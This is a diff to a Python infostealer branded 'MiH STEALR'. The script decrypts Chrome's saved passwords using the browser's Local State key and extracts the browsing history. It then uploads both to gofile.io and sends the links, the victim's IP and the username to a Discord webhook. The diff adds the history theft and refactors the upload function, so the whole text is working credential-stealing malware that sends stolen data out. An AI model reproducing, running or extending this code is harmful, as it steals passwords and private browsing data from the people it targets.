@@ -3,22 +3,21 @@ import base64
 import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
-import shutil
 from datetime import datetime, timedelta
 import requests
 import zipfile
 import os
+import shutil
+from geopy.geocoders import Nominatim
 
 def get_chrome_datetime(chromedate):
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
 def get_encryption_key():
-    local_state_path = os.path.join(os.environ["USERPROFILE"],
-                                    "AppData", "Local", "Google", "Chrome",
-                                    "User Data", "Local State")
+    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+    
     with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = f.read()
-        local_state = json.loads(local_state)
+        local_state = json.loads(f.read())
 
     key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     key = key[5:]
@@ -36,6 +35,41 @@ def decrypt_password(password, key):
         except:
             return ""
 
+def extract_chrome_history(output_file="chrome_history.txt"):
+    key = get_encryption_key()
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "History")
+    temp_db_path = "temp_history_copy"
+
+    shutil.copy2(db_path, temp_db_path)
+
+    connection = sqlite3.connect(temp_db_path)
+    cursor = connection.cursor()
+
+    query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC"
+    cursor.execute(query)
+    history_entries = cursor.fetchall()
+
+    connection.close()
+
+    with open(output_file, "w", encoding="utf-8") as file:
+        file.write("___  ___  ___ ______ _____   _____ _   _   _   _  _____  ___  _   _ _____ _   _\n")
+        file.write("|  \\/  | / _ \\|  _  \\  ___| |_   _| \\ | | | | | ||  ___|/ _ \\| | | |  ___| \\ | |\n")
+        file.write("| .  . |/ /_\\ \\ | | | |__     | | |  \\| | | |_| || |__ / /_\\ \\ | | | |__ |  \\| |\n")
+        file.write("| |\\/| ||  _  | | | |  __|    | | | . ` | |  _  ||  __||  _  | | | |  __|| . ` |\n")
+        file.write("| |  | || | | | |/ /| |___   _| |_| |\\  | | | | || |___| | | \\ \\_/ / |___| |\\  |\n")
+        file.write("\\_|  |_/\\_| |_/___/ \\____/   \\___/\\_| \\_/ \\_| |_/\____/\\_| |_/\\___/\\____/\\_| \\_/\n")
+        file.write("\n")
+
+        file.write("URL, Titre, Dernière visite\n")
+        for entry in history_entries:
+            file.write(f"{entry[0]}, {entry[1]}, {entry[2]}\n")
+
+def upload_to_anonfiles(path):
+    try:
+        server_url = f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile'
+        return requests.post(server_url, files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
+    except:
+        return False
 def main():
     key = get_encryption_key()
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
@@ -87,28 +121,37 @@ def main():
         zipf.write('decrypted_passwords.txt')
 
     username = os.getenv("USERNAME")
+    pass_link = upload_to_anonfiles('decrypted_passwords.zip')
+    history_link = upload_to_anonfiles('chrome_history.txt')
 
-    download_link = uploadToAnonfiles('decrypted_passwords.zip')
-
-    if download_link:
-        webhook_url = ''
+    if pass_link:
+        webhook_url = 'https://discord.com/api/webhooks/your_webhook_url'
         ip_address = requests.get("https://api.ipify.org/").text
+
         embeds = {
             "avatar_url": "https://cdn.discordapp.com/attachments/1168866780941389934/1172967173916999810/ab67616d0000b273f9ae145ca74784398c3b6c9b.png?ex=65623dce&is=654fc8ce&hm=5846dec8fdea603dd3f7aea0f55fd46819636029b0f9f6daf87715b0f27189e2&",
             "username": "MiH STEALR",
-            "embeds": [{
-                "title": "YOU'VE REACHED HEAVEN !",
-                "fields": [
-                    {"name": "Victim's IP", "value": f"```{ip_address}```", "inline": True},
-                    {"name": "Session user", "value": f"```{username}```", "inline": True}
-                ]
-            },
-            {
-                "title": "Credentials",
-                "fields": [
-                    {"name": "Retrieved passwords", "value": f"```{download_link}```", "inline": True}
-                ]
-            }]
+            "embeds": [
+                {
+                    "title": "YOU'VE REACHED HEAVEN !",
+                    "fields": [
+                        {"name": "Victim's IP :", "value": f"```{ip_address}```", "inline": True},
+                        {"name": "Session user :", "value": f"```{username}```", "inline": True}
+                    ]
+                },
+                {
+                    "title": "Credentials",
+                    "fields": [
+                        {"name": "Retrieved passwords :", "value": f"```{pass_link}```", "inline": True}
+                    ]
+                },
+                {
+                    "title": "Credentials",
+                    "fields": [
+                        {"name": "Chrome History :", "value": f"```{history_link}```", "inline": True}
+                    ]
+                }
+            ]
         }
 
         response = requests.post(webhook_url, json=embeds)
@@ -120,11 +163,6 @@ def main():
     else:
         print('Erreur lors de l\'upload du fichier vers Anonfiles.')
 
-def uploadToAnonfiles(path):
-    try:
-        return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
-    except:
-        return False
-
 if __name__ == "__main__":
+    extract_chrome_history()
     main()
